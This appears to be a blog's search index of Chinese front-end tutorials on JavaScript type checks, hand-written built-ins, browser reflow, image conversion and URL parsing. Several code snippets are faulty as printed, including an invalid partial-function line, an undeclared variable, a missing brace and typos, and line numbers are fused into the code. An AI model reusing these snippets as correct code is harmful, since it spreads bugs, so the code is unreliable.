<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[数据类型检测]]></title>
    <url>%2F%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[常见的类型检测的分为以下几种，优缺点各不相同。 typeoftypeof 对于原始类型来说，除了 null 都可以显示正确的类型 12345678console.log(typeof 2); // numberconsole.log(typeof true); // booleanconsole.log(typeof 'str'); // stringconsole.log(typeof []); // object []数组的数据类型在 typeof 中被解释为 objectconsole.log(typeof function()&#123;&#125;); // functionconsole.log(typeof &#123;&#125;); // objectconsole.log(typeof undefined); // undefinedconsole.log(typeof null); // object null 的数据类型被 typeof 解释为 object typeof 对于对象来说，除了函数都会显示 object，所以说 typeof 并不能准确判断变量到底是什么类型,所以想判断一个对象的正确类型，这时候可以考虑使用 instanceof instanceofinstanceof 可以正确的判断对象的类型，因为内部机制是通过判断对象的原型链中是不是能找到类型的 prototype 12345678console.log(2 instanceof Number); // falseconsole.log(true instanceof Boolean); // false console.log('str' instanceof String); // false console.log([] instanceof Array); // trueconsole.log(function()&#123;&#125; instanceof Function); // trueconsole.log(&#123;&#125; instanceof Object); // true // console.log(undefined instanceof Undefined);// console.log(null instanceof Null); instanceof 可以准确地判断复杂引用数据类型，但是不能正确判断基础数据类型；而 typeof 也存在弊端，它虽然可以判断基础数据类型（null 除外），但是引用数据类型中，除了 function 类型以外，其他的也无法判断 123456789101112131415161718192021222324// 我们也可以试着实现一下 instanceoffunction _instanceof(left, right) &#123; // 由于instance要检测的是某对象，需要有一个前置判断条件 //基本数据类型直接返回false if(typeof left !== 'object' || left === null) return false; // 获得类型的原型 let prototype = right.prototype // 获得对象的原型 left = left.__proto__ // 判断对象的类型是否等于类型的原型 while (true) &#123; if (left === null) return false if (prototype === left) return true left = left.__proto__ &#125;&#125;console.log('test', _instanceof(null, Array)) // falseconsole.log('test', _instanceof([], Array)) // trueconsole.log('test', _instanceof('', Array)) // falseconsole.log('test', _instanceof(&#123;&#125;, Object)) // true constructor123456console.log((2).constructor === Number); // trueconsole.log((true).constructor === Boolean); // trueconsole.log(('str').constructor === String); // trueconsole.log(([]).constructor === Array); // trueconsole.log((function() &#123;&#125;).constructor === Function); // trueconsole.log((&#123;&#125;).constructor === Object); // true 如果创建一个对象，更改它的原型，constructor就会变得不可靠了 12345678function Fn()&#123;&#125;; Fn.prototype=new Array(); var f=new Fn(); console.log(f.constructor===Fn); // falseconsole.log(f.constructor===Array); // true Object.prototype.toString.call()toString() 是 Object 的原型方法，调用该方法，可以统一返回格式为 “[object Xxx]” 的字符串，其中 Xxx 就是对象的类型。对于 Object 对象，直接调用 toString() 就能返回 [object Object]；而对于其他对象，则需要通过 call 来调用，才能返回正确的类型信息。我们来看一下代码。 123456789101112131415Object.prototype.toString(&#123;&#125;) // "[object Object]"Object.prototype.toString.call(&#123;&#125;) // 同上结果，加上call也okObject.prototype.toString.call(1) // "[object Number]"Object.prototype.toString.call('1') // "[object String]"Object.prototype.toString.call(true) // "[object Boolean]"Object.prototype.toString.call(function()&#123;&#125;) // "[object Function]"Object.prototype.toString.call(null) //"[object Null]"Object.prototype.toString.call(undefined) //"[object Undefined]"Object.prototype.toString.call(/123/g) //"[object RegExp]"Object.prototype.toString.call(new Date()) //"[object Date]"Object.prototype.toString.call([]) //"[object Array]"Object.prototype.toString.call(document) //"[object HTMLDocument]"Object.prototype.toString.call(window) //"[object Window]"// 从上面这段代码可以看出，Object.prototype.toString.call() 可以很好地判断引用类型，甚至可以把 document 和 window 都区分开来。 1234567891011function typeOf1(obj)&#123; let type = typeof obj; if (type !== "object") &#123; return type; &#125; return Object.prototype.toString.call(obj).replace(/^\[object (\S+)\]$/, '$1'); // 注意正则中间有个空格&#125;function typeOf2()&#123; return Object.prototype.toString.call(obj).slice(8, -1).toLowerCase()&#125; 总结 typeof 直接在计算机底层基于数据类型的值（二进制）进行检测 typeof null为object 原因是对象存在在计算机中，都是以000开始的二进制存储，所以检测出来的结果是对象 typeof 普通对象/数组对象/正则对象/日期对象 都是object typeof NaN === ‘number’ instanceof 检测当前实例是否属于这个类的 底层机制：只要当前类出现在实例的原型上，结果都是true 不能检测基本数据类型 constructor 支持基本类型 constructor可以随便改，也不准 Object.prototype.toString.call([val]) 返回当前实例所属类信息 判断 Target 的类型，单单用 typeof 并无法完全满足，这其实并不是 bug，本质原因是 JS 的万物皆对象的理论。因此要真正完美判断时，我们需要区分对待: 基本类型(null): 使用 String(null) 基本类型(string / number / boolean / undefined) + function: - 直接使用 typeof即可 其余引用类型(Array / Date / RegExp Error): 调用toString后根据[object XXX]进行判断]]></content>
  </entry>
  <entry>
    <title><![CDATA[原生js手写]]></title>
    <url>%2F%E5%8E%9F%E7%94%9Fjs%E6%89%8B%E5%86%99%2F</url>
    <content type="text"><![CDATA[通过基础的代码，实现原生js的一些方法。更有利于对JavaScript加深理解。 部分内容具体实现可参考冴羽的深入系列。 数据类型判断123function typeOf()&#123; return Object.prototype.toString.call(obj).slice(8, -1).toLowerCase()&#125; 数组去重12345678910// 类似的还有indexOf，includes，some等等function unique(arr) &#123; var res = arr.filter(function(item, index, array) &#123; return array.indexOf(item) === index &#125;) return res&#125;// es6var unique = arr =&gt; [...new Set(arr)] 数组扁平化1234567891011121314function flatten(arr) &#123; var result = []; for (var i = 0, len = arr.length; i &lt; len; i++) &#123; if (Array.isArray(arr[i])) &#123; result = result.concat(flatten(arr[i])) &#125; else &#123; result.push(arr[i]) &#125; &#125; return result;&#125;// es6，参数为处理几层，默认1Array.prototype.flat(infinity) 浅拷贝12345678910111213141516171819202122232425262728// 它不会拷贝对象的继承属性；// 它不会拷贝对象的不可枚举的属性；// 可以拷贝 Symbol 类型的属性。Object.assign(target, ...sources)// 对象扩展符，和上面的类似let cloneObj = &#123; ...obj &#125;;// concat 拷贝数组let newArr = arr.concat();// slice 拷贝数组let newArr = arr.slice();// 手动实现const shallowClone = (target) =&gt; &#123; if (typeof target === 'object' &amp;&amp; target !== null) &#123; const cloneTarget = Array.isArray(target) ? []: &#123;&#125;; for (let prop in target) &#123; if (target.hasOwnProperty(prop)) &#123; cloneTarget[prop] = target[prop]; &#125; &#125; return cloneTarget; &#125; else &#123; return target; &#125;&#125; 深拷贝1234567891011121314151617181920212223242526272829303132// 简单版，忽略undefund，symbol，无法转换正则日期等对象，不能循环引用对象JSON.parse(JSON.stringify(Obj))// 手写版const isComplexDataType = obj =&gt; (typeof obj === 'object' || typeof obj === 'function') &amp;&amp; (obj !== null)const deepClone = function (obj, hash = new WeakMap()) &#123; if (obj.constructor === Date) &#123; return new Date(obj) // 日期对象直接返回一个新的日期对象 &#125; if (obj.constructor === RegExp)&#123; return new RegExp(obj) //正则对象直接返回一个新的正则对象 &#125; //如果循环引用了就用 weakMap 来解决 if (hash.has(obj)) &#123; return hash.get(obj) &#125; let allDesc = Object.getOwnPropertyDescriptors(obj) //遍历传入参数所有键的特性 let cloneObj = Object.create(Object.getPrototypeOf(obj), allDesc) // 把cloneObj原型复制到obj上 hash.set(obj, cloneObj) for (let key of Reflect.ownKeys(obj)) &#123; cloneObj[key] = (isComplexDataType(obj[key]) &amp;&amp; typeof obj[key] !== 'function') ? deepClone(obj[key], hash) : obj[key] &#125; return cloneObj&#125; 发布订阅模式同观察者模式区别在于，没有中间消息处理中心，可参考观察者模式 vs 发布订阅模式 123456789101112131415161718192021222324252627282930313233class EventEmitter &#123; constructor() &#123; this.cache = &#123;&#125; &#125; on(name, fn) &#123; if (this.cache[name]) &#123; this.cache[name].push(fn) &#125; else &#123; this.cache[name] = [fn] &#125; &#125; off(name, fn) &#123; let tasks = this.cache[name] if (tasks) &#123; const index = tasks.findIndex(f =&gt; f === fn || f.callback === fn) if (index &gt;= 0) &#123; tasks.splice(index, 1) &#125; &#125; &#125; emit(name, once = false, ...args) &#123; if (this.cache[name]) &#123; // 创建副本，如果回调函数内继续注册相同事件，会造成死循环 let tasks = this.cache[name].slice() for (let fn of tasks) &#123; fn(...args) &#125; if (once) &#123; delete this.cache[name] &#125; &#125; &#125;&#125; 字符串模版123456789function render(template, data) &#123; const reg = /\&#123;\&#123;(\w+)\&#125;\&#125;/; // 模板字符串正则 if (reg.test(template)) &#123; // 判断模板里是否有模板字符串 const name = reg.exec(template)[1]; // 查找当前模板里第一个模板字符串的字段 template = template.replace(reg, data[name]); // 将第一个模板字符串渲染 return render(template, data); // 递归的渲染并返回渲染后的结构 &#125; return template; // 如果模板没有模板字符串直接返回&#125; 防抖123456789101112131415161718192021222324252627282930313233343536373839404142function debounce(func, wait) &#123; var timeout; return function () &#123; var context = this; var args = arguments; clearTimeout(timeout) timeout = setTimeout(function()&#123; func.apply(context, args) &#125;, wait); &#125;&#125;// 最终版function debounce(func, wait, immediate) &#123; var timeout, result; var debounced = function () &#123; var context = this; var args = arguments; if (timeout) clearTimeout(timeout); if (immediate) &#123; var callNow = !timeout; timeout = setTimeout(function()&#123; timeout = null; &#125;, wait) if (callNow) result = func.apply(context, args) &#125; else &#123; timeout = setTimeout(function()&#123; func.apply(context, args) &#125;, wait); &#125; return result; &#125;; debounced.cancel = function() &#123; clearTimeout(timeout); timeout = null; &#125;; return debounced;&#125; 节流123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function throttle(func, wait) &#123; var context, args; var previous = 0; return function() &#123; var now = +new Date(); context = this; args = arguments; if (now - previous &gt; wait) &#123; func.apply(context, args); previous = now; &#125; &#125;&#125;// 最终版function throttle(func, wait, options) &#123; var timeout, context, args, result; var previous = 0; if (!options) options = &#123;&#125;; var later = function() &#123; previous = options.leading === false ? 0 : new Date().getTime(); timeout = null; func.apply(context, args); if (!timeout) context = args = null; &#125;; var throttled = function() &#123; var now = new Date().getTime(); if (!previous &amp;&amp; options.leading === false) previous = now; var remaining = wait - (now - previous); context = this; args = arguments; if (remaining &lt;= 0 || remaining &gt; wait) &#123; if (timeout) &#123; clearTimeout(timeout); timeout = null; &#125; previous = now; func.apply(context, args); if (!timeout) context = args = null; &#125; else if (!timeout &amp;&amp; options.trailing !== false) &#123; timeout = setTimeout(later, remaining); &#125; &#125;; throttled.cancel = function() &#123; clearTimeout(timeout); previous = 0; timeout = null; &#125; return throttled;&#125; 柯里化1234567function curry(fn) &#123; let judge = (...args) =&gt; &#123; if (args.length == fn.length) return fn(...args) return (...arg) =&gt; judge(...args, ...arg) &#125; return judge&#125; 偏函数123456function partial(fn, ...args) &#123; return (...arg) =&gt; &#123; args[index] = return fn(...args, ...arg) &#125;&#125; JSONP123456789101112131415161718192021const jsonp = (&#123; url, params, callbackName &#125;) =&gt; &#123; const generateUrl = () =&gt; &#123; let dataSrc = '' for (let key in params) &#123; if (params.hasOwnProperty(key)) &#123; dataSrc += `$&#123;key&#125;=$&#123;params[key]&#125;&amp;` &#125; &#125; dataSrc += `callback=$&#123;callbackName&#125;` return `$&#123;url&#125;?$&#123;dataSrc&#125;` &#125; return new Promise((resolve, reject) =&gt; &#123; const scriptEle = document.createElement('script') scriptEle.src = generateUrl() document.body.appendChild(scriptEle) window[callbackName] = data =&gt; &#123; resolve(data) document.removeChild(scriptEle) &#125; &#125;)&#125; Ajax12345678910111213141516const getJSON = function(url) &#123; return new Promise((resolve, reject) =&gt; &#123; const xhr = XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Mscrosoft.XMLHttp'); xhr.open('GET', url, false); xhr.setRequestHeader('Accept', 'application/json'); xhr.onreadystatechange = function() &#123; if (xhr.readyState !== 4) return; if (xhr.status === 200 || xhr.status === 304) &#123; resolve(xhr.responseText); &#125; else &#123; reject(new Error(xhr.responseText)); &#125; &#125; xhr.send(); &#125;)&#125; call、apply、bind利用obj.fn的this指向obj。可参考JavaScript深入之call和apply的模拟实现相关内容。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Function.prototype.call2 = function (context) &#123; var context = context || window; context.fn = this; var args = []; for(var i = 1, len = arguments.length; i &lt; len; i++) &#123; args.push('arguments[' + i + ']'); &#125; var result = eval('context.fn(' + args +')'); delete context.fn return result;&#125;Function.prototype.apply2 = function (context, arr) &#123; var context = context || window; context.fn = this; var result; if (!arr) &#123; result = context.fn(); &#125; else &#123; var args = []; for (var i = 0, len = arr.length; i &lt; len; i++) &#123; args.push('arr[' + i + ']'); &#125; result = eval('context.fn(' + args + ')') &#125; delete context.fn return result;&#125;Function.prototype.bind2 = function (context) &#123; var self = this; var args = Array.prototype.slice.call(arguments, 1); var fNOP = function () &#123;&#125;; var fBound = function () &#123; var bindArgs = Array.prototype.slice.call(arguments); // 处理new时 return self.apply(this instanceof fNOP ? this : context, args.concat(bindArgs)); &#125; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound;&#125; new123456789function objectFactory() &#123; var obj = new Object() Constructor = [].shift.call(arguments); obj.__proto__ = Constructor.prototype; var ret = Constructor.apply(obj, arguments); // 存在值为对象的情况应返回对象，否则返回生成的对象 return typeof ret === 'object' ? ret || obj : obj;&#125;; instanceof12345678910function instanceOf(left, right) &#123; let proto = left.__proto__ while (true) &#123; if (proto === null) return false if (proto === right.prototype) &#123; return true &#125; proto = proto.__proto__ &#125;&#125; Object.create123456789101112131415161718Object.create2 = function(proto, propertyObject = undefined) &#123; if (typeof proto !== 'object' &amp;&amp; typeof proto !== 'function') &#123; throw new TypeError('Object prototype may only be an Object or null.') if (propertyObject == null) &#123; new TypeError('Cannot convert undefined or null to object') &#125; function F() &#123;&#125; F.prototype = proto const obj = new F() if (propertyObject != undefined) &#123; Object.defineProperties(obj, propertyObject) &#125; if (proto === null) &#123; // 创建一个没有原型对象的对象，Object.create(null) obj.__proto__ = null &#125; return obj&#125; Object.assign12345678910111213141516Object.assign2 = function(target, ...source) &#123; if (target == null) &#123; throw new TypeError('Cannot convert undefined or null to object') &#125; let ret = Object(target) source.forEach(function(obj) &#123; if (obj != null) &#123; for (let key in obj) &#123; if (obj.hasOwnProperty(key)) &#123; ret[key] = obj[key] &#125; &#125; &#125; &#125;) return ret&#125; Promise从一道让我失眠的 Promise 面试题开始，深入分析 Promise 实现细节要就来45道Promise面试题一次爽到底]]></content>
  </entry>
  <entry>
    <title><![CDATA[浏览器的回流与重绘]]></title>
    <url>%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%9B%9E%E6%B5%81%E4%B8%8E%E9%87%8D%E7%BB%98%2F</url>
    <content type="text"><![CDATA[回流：也被称为重排，或者布局阶段重绘：绘制阶段 浏览器的渲染过程本文先从浏览器的渲染过程来从头到尾的讲解一下回流重绘，如果大家想直接看如何减少回流和重绘，优化性能，可以跳到后面。 从上面这个图上，我们可以看到，浏览器渲染过程如下： 解析HTML，生成DOM树，解析CSS，生成CSSOM树 将DOM树和CSSOM树结合，生成渲染树(Render Tree) Layout(回流):根据生成的渲染树，进行回流(Layout)，得到节点的几何信息（位置，大小） Painting(重绘):根据渲染树以及回流得到的几何信息，得到节点的绝对像素 Display:将像素发送给GPU，展示在页面上。 渲染过程看起来很简单，让我们来具体了解下每一步具体做了什么。 生成渲染树 为了构建渲染树，浏览器主要完成了以下工作： 从DOM树的根节点开始遍历每个可见节点。 对于每个可见的节点，找到CSSOM树中对应的规则，并应用它们。 根据每个可见节点以及其对应的样式，组合生成渲染树。 第一步中，既然说到了要遍历可见的节点，那么我们得先知道，什么节点是不可见的。不可见的节点包括： 一些不会渲染输出的节点，比如script、meta、link等。 一些通过css进行隐藏的节点。比如display:none。注意，利用visibility和opacity隐藏的节点，还是会显示在渲染树上的。只有display:none的节点才不会显示在渲染树上。 从上面的例子来讲，我们可以看到span标签的样式有一个display:none，因此，它最终并没有在渲染树上。注意：渲染树只包含可见的节点 回流前面我们通过构造渲染树，我们将可见DOM节点以及它对应的样式结合起来，可是我们还需要计算它们在设备视口(viewport)内的确切位置和大小，这个计算的阶段就是回流。 重绘最终，我们通过构造渲染树和回流阶段，我们知道了哪些节点是可见的，以及可见节点的样式和具体的几何信息(位置、大小)，那么我们就可以将渲染树的每个节点都转换为屏幕上的实际像素，这个阶段就叫做重绘节点。既然知道了浏览器的渲染过程后，我们就来探讨下，何时会发生回流重绘。 何时发生回流重绘我们前面知道了，回流这一阶段主要是计算节点的位置和几何信息，那么当页面布局和几何信息发生变化的时候，就需要回流。比如以下情况： 添加或删除可见的DOM元素 元素的位置发生变化 元素的尺寸发生变化（包括外边距、内边框、边框大小、高度和宽度等） 内容发生变化，比如文本变化或图片被另一个不同尺寸的图片所替代。 页面一开始渲染的时候（这肯定避免不了） 浏览器的窗口尺寸变化（因为回流是根据视口的大小来计算元素的位置和大小的） 注意：回流一定会触发重绘，而重绘不一定会回流根据改变的范围和程度，渲染树中或大或小的部分需要重新计算，有些改变会触发整个页面的重排，比如，滚动条出现的时候或者修改了根节点。 浏览器的优化机制现代的浏览器都是很聪明的，由于每次重排都会造成额外的计算消耗，因此大多数浏览器都会通过队列化修改并批量执行来优化重排过程。浏览器会将修改操作放入到队列里，直到过了一段时间或者操作达到了一个阈值，才清空队列。但是！当你获取布局信息的操作的时候，会强制队列刷新，比如当你访问以下属性或者使用以下方法： offsetTop、offsetLeft、offsetWidth、offsetHeight scrollTop、scrollLeft、scrollWidth、scrollHeight clientTop、clientLeft、clientWidth、clientHeight getComputedStyle() getBoundingClientRect 具体可以访问这个网站：https://link.juejin.cn/?target=https%3A%2F%2Fgist.github.com%2Fpaulirish%2F5d52fb081b3570c81e3a 以上属性和方法都需要返回最新的布局信息，因此浏览器不得不清空队列，触发回流重绘来返回正确的值。因此，我们在修改样式的时候，最好避免使用上面列出的属性，他们都会刷新渲染队列。如果要使用它们，最好将值缓存起来。 减少回流和重绘前面说了这么多背景和理论知识，接下来让我们谈谈如何减少回流和重绘。 最小化重绘和重排由于重绘和重排可能代价比较昂贵，因此最好就是可以减少它的发生次数。为了减少发生次数，我们可以合并多次对DOM和样式的修改，然后一次处理掉。考虑这个例子 1234const el = document.getElementById('test');el.style.padding = '5px';el.style.borderLeft = '1px';el.style.borderRight = '2px'; 例子中，有三个样式属性被修改了，每一个都会影响元素的几何结构，引起回流。当然，大部分现代浏览器都对其做了优化，因此，只会触发一次重排。但是如果在旧版的浏览器或者在上面代码执行的时候，有其他代码访问了布局信息(上文中的会触发回流的布局信息)，那么就会导致三次重排。 因此，我们可以合并所有的改变然后依次处理，比如我们可以采取以下的方式： 使用cssText12const el = document.getElementById('test');el.style.cssText += 'border-left: 1px; border-right: 2px; padding: 5px;'; 修改CSS的class12const el = document.getElementById('test');el.className += ' active'; 批量修改DOM当我们需要对DOM对一系列修改的时候，可以通过以下步骤减少回流重绘次数： 使元素脱离文档流 对其进行多次修改 将元素带回到文档中。 该过程的第一步和第三步可能会引起回流，但是经过第一步之后，对DOM的所有修改都不会引起回流重绘，因为它已经不在渲染树了。有三种方式可以让DOM脱离文档流： 隐藏元素，应用修改，重新显示 使用文档片段(document fragment)在当前DOM之外构建一个子树，再把它拷贝回文档。 将原始元素拷贝到一个脱离文档的节点中，修改节点后，再替换原始的元素。 考虑我们要执行一段批量插入节点的代码： 1234567891011function appendDataToElement(appendToElement, data) &#123; let li; for (let i = 0; i &lt; data.length; i++) &#123; li = document.createElement('li'); li.textContent = 'text'; appendToElement.appendChild(li); &#125;&#125;const ul = document.getElementById('list');appendDataToElement(ul, data); 如果我们直接这样执行的话，由于每次循环都会插入一个新的节点，会导致浏览器回流一次。 我们可以使用这三种方式进行优化: 隐藏元素，应用修改，重新显示这个会在展示和隐藏节点的时候，产生两次回流 123456789101112function appendDataToElement(appendToElement, data) &#123; let li; for (let i = 0; i &lt; data.length; i++) &#123; li = document.createElement('li'); li.textContent = 'text'; appendToElement.appendChild(li); &#125;&#125;const ul = document.getElementById('list');ul.style.display = 'none';appendDataToElement(ul, data);ul.style.display = 'block'; 使用文档片段(document fragment)在当前DOM之外构建一个子树，再把它拷贝回文档1234const ul = document.getElementById('list');const fragment = document.createDocumentFragment();appendDataToElement(fragment, data);ul.appendChild(fragment); 将原始元素拷贝到一个脱离文档的节点中，修改节点后，再替换原始的元素1234const ul = document.getElementById('list');const clone = ul.cloneNode(true);appendDataToElement(clone, data);ul.parentNode.replaceChild(clone, ul); 对于上面这三种情况，我写了一个demo在safari和chrome上测试修改前和修改后的性能。然而实验结果不是很理想。 原因：原因其实上面也说过了，现代浏览器会使用队列来储存多次修改，进行优化，所以对这个优化方案，我们其实不用优先考虑。 避免触发同步布局事件上文我们说过，当我们访问元素的一些属性的时候，会导致浏览器强制清空队列，进行强制同步布局。举个例子，比如说我们想将一个p标签数组的宽度赋值为一个元素的宽度，我们可能写出这样的代码： 12345function initP() &#123; for (let i = 0; i &lt; paragraphs.length; i++) &#123; paragraphs[i].style.width = box.offsetWidth + 'px'; &#125;&#125; 这段代码看上去是没有什么问题，可是其实会造成很大的性能问题。在每次循环的时候，都读取了box的一个offsetWidth属性值，然后利用它来更新p标签的width属性。这就导致了每一次循环的时候，浏览器都必须先使上一次循环中的样式更新操作生效，才能响应本次循环的样式读取操作。每一次循环都会强制浏览器刷新队列。我们可以优化为: 123456const width = box.offsetWidth;function initP() &#123; for (let i = 0; i &lt; paragraphs.length; i++) &#123; paragraphs[i].style.width = width + 'px'; &#125;&#125; 对于复杂动画效果,使用绝对定位让其脱离文档流对于复杂动画效果，由于会经常的引起回流重绘，因此，我们可以使用绝对定位，让它脱离文档流。否则会引起父元素以及后续元素频繁的回流。 css3硬件加速（GPU加速）比起考虑如何减少回流重绘，我们更期望的是，根本不要回流重绘。这个时候，css3硬件加速就闪亮登场啦！！划重点： 使用css3硬件加速，可以让transform、opacity、filters这些动画不会引起回流重绘 。 对于动画的其它属性，比如background-color这些，还是会引起回流重绘的，不过它还是可以提升这些动画的性能。 常见的触发硬件加速的css属性： transform opacity filters Will-change 使用css3硬件加速，可以让transform、opacity、filters这些动画不会引起回流重绘对于动画的其它属性，比如background-color这些，还是会引起回流重绘的，不过它还是可以提升这些动画的性能。 css3硬件加速的坑当然，任何美好的东西都是会有对应的代价的，过犹不及。css3硬件加速还是有坑的: 如果你为太多元素使用css3硬件加速，会导致内存占用较大，会有性能问题。在GPU渲染字体会导致抗锯齿无效。这是因为GPU和CPU的算法不同。因此如果你不在动画结束的时候关闭硬件加速，会产生字体模糊。 转载链接：https://juejin.cn/post/6844903779700047885]]></content>
  </entry>
  <entry>
    <title><![CDATA[线上调试vue-devtools]]></title>
    <url>%2F%E7%BA%BF%E4%B8%8A%E8%B0%83%E8%AF%95vue-devtools%2F</url>
    <content type="text"><![CDATA[调试线上vue项目，在某些特殊情况下使用。 步骤 按F12找到Source选项卡，找到app.js文件，点击下方{}格式化文件 ctrl + f搜索$mount,在new处打断点，new后面的对象是Vue对象，记住该变量名，例如：d[&quot;default&quot;] F5刷新页面，此时进入断点，在控制台输入指令d[&quot;default&quot;].config.devtools = true 结束断点，关闭控制台，重新打开即可看到vue-devtools选项卡]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[提问的艺术]]></title>
    <url>%2F%E6%8F%90%E9%97%AE%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[如何处理难以解决问题。 方法]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片格式转换]]></title>
    <url>%2F%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[图片canvas，file，blob，DataURL等格式转换。 file转base6412345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;base&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="file" name="" id="file"&gt;&lt;img src="" id="img"&gt;&lt;script type="text/javascript"&gt; // 方法一：利用URL.createObjectURL() ==&gt; blob:null/xxxxxx window.onload = function () &#123; let $img = document.getElementById('img') file.onchange = function (e) &#123; console.log(e.target.files[0]) let file = e.target.files[0] let fileUrl = window.URL.createObjectURL(file) $img.src = fileUrl img.onload = function () &#123; // 手动回收 URL.revokeObjectURL(fileUrl) &#125; &#125; &#125; // 利用FileReader.readAsDataURL() ==&gt; data:image/jpeg;base64,xxxxxx window.onload = function () &#123; let $img = document.getElementById('img') file.onchange = function (e) &#123; console.log(e.target.files[0]) let file = e.target.files[0] const fr = new FileReader(file) fr.readAsDataURL(file) fr.onload = function () &#123; $img.src = this.result &#125; &#125; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; canvas转DataURL12345678// toBlob(callback, type, quality)// callback// 回调函数，可获得一个单独的 Blob 对象参数。如果图像未被成功创建，可能会获得 null 值。// type 可选// DOMString 类型，指定图片格式，默认格式（未指定或不支持）为 image/png。// quality 可选// Number 类型，值在 0 与 1 之间，当请求图片格式为 image/jpeg 或者 image/webp 时用来指定图片展示质量。如果这个参数的值不在指定类型与范围之内，则使用默认值，其余参数将被忽略。canvas.toBlob(function(blob)&#123;...&#125;, "image/jpeg", 0.95); // JPEG at 95% Blob对象显示图片1234canvas.toBlob(function (blobObj) &#123; let imgSrc = window.URL.createObjectURL(blobObj) document.getElementById('img').src = imgSrc&#125;) 下载DataURL表示的图片123456function downloadImg () &#123; let aLink = document.createElement('a') aLink.download = 'fileName.png' // 文件名后缀需要和dataurl表示的相同，否则可能乱码 aLink.href = dataUrl aLink.click()&#125;]]></content>
      <tags>
        <tag>js</tag>
        <tag>Image</tag>
        <tag>Canvas</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[z-index层级点击问题]]></title>
    <url>%2Fz-index%E5%B1%82%E7%BA%A7%E7%82%B9%E5%87%BB%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[两个弹出层，第一个层级高于第二个层级，想触发第二个层级的点击事件 解决方案对上层元素使用以下属性，可穿透点击层 1pointer-events: none; 如果想让上层元素的子元素部分可点击，在可点击的元素上添加 1pointer-events: auto;]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随机数组]]></title>
    <url>%2F%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%84%2F</url>
    <content type="text"><![CDATA[随机化Javascript数组（随机播放）。 实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// 第一种Array.prototype.shuffle = function() &#123; var i = this.length, j, temp; if ( i == 0 ) return this; while ( --i ) &#123; j = Math.floor( Math.random() * ( i + 1 ) ); temp = this[i]; this[i] = this[j]; this[j] = temp; &#125; return this;&#125;// 优化function shuffleArray(array) &#123; for (var i = array.length - 1; i &gt; 0; i--) &#123; var j = Math.floor(Math.random() * (i + 1)); var temp = array[i]; array[i] = array[j]; array[j] = temp; &#125;&#125;// 压缩上一版function shuffleArray(d) &#123; for (var c = d.length - 1; c &gt; 0; c--) &#123; var b = Math.floor(Math.random() * (c + 1)); var a = d[c]; d[c] = d[b]; d[b] = a; &#125; return d&#125;;// es6function shuffleArray(array) &#123; for (let i = array.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * (i + 1)); [array[i], array[j]] = [array[j], array[i]]; &#125;&#125;// 使用 underscore.js 库var _ = require("underscore");var arr = [1,2,3,4,5,6];var testShuffle = function () &#123; var indexOne = 0; var stObj = &#123; '0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5 &#125;; for (var i = 0; i &lt; 1000; i++) &#123; arr = _.shuffle(arr); indexOne = _.indexOf(arr, 1); stObj[indexOne] ++; &#125; console.log(stObj);&#125;;testShuffle();]]></content>
      <tags>
        <tag>js</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巧用a标签解析url]]></title>
    <url>%2F%E5%B7%A7%E7%94%A8a%E6%A0%87%E7%AD%BE%E8%A7%A3%E6%9E%90url%2F</url>
    <content type="text"><![CDATA[重构旧有项目，遇到的比较有意思的点，对于url的解析，并不单单可以通过字符串分割和正则的方式，通过a标签，可以更快捷的做到某些点。 假设现在要解析的网址 url=&quot;https://luckyp.top/alinkurl/?id=1#name=haha&quot;; 1234567891011121314const alink = document.createElement("a"); // 创建一个a标签alink.href = url; // 将url设置为a标签的href属性，console.log(alink.protocol); // 取协议 ===》https:console.log(alink.hostname); // 取服务器主机===》luckyp.topconsole.log(alinkpathname); // 取查询路径===》/alinkurlconsole.log(alink.search); // 取查询参数===》?id=1console.log(alink.hash); // 取#===》#name=haha]]></content>
      <tags>
        <tag>url</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[.npmrc相关]]></title>
    <url>%2Fnpmrc%E7%9B%B8%E5%85%B3%2F</url>
